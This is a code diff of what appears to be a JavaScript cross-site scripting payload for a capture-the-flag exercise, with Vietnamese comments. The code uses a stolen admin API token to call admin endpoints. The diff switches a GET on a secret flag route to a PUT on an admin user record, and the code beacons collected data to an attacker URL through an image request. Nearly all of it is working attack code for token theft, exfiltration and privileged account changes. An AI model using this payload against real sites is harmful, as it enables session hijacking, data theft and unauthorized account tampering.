@@ -15,7 +15,7 @@
                 params.append("source_tag", "name:description_GET_FLAG_V1");
                 for (var key in data) { 
                     let val_str = String(data[key]);
-                    params.append(key, val_str.substring(0,1000)); // Tăng giới hạn lên 1000 cho flag
+                    params.append(key, val_str.substring(0,1000));
                 }
                 new Image().src = attacker_url + "?" + params.toString();
             }
@@ -71,14 +71,14 @@
                     });
 
                     // Bước 2: Dùng API Token để lấy FLAG_2
-                    return fetch("/api/admin/sup3rs3cr3t", {
-                        method: "GET",
-                        headers: {
-                            "Accept": "application/json",
-                            "Authorization": "Bearer " + adminApiToken, // QUAN TRỌNG!
-                            "X-Requested-With": "XMLHttpRequest"
-                        }
-                    });
+                    return fetch("/api/admin/users/216", {
+                            method: "PUT",
+                            headers: {
+                               "Accept": "application/json",
+                                "Authorization": "Bearer " + adminApiToken, // QUAN TRỌNG!
+                                "X-Requested-With": "XMLHttpRequest"
+                            }
+                        });
                 } else {
                     sendPing({ stage: "gen_token_SUCCESS_but_no_token_field", received_data: JSON.stringify(data) });
                     throw new Error("No token field in generate-token response");
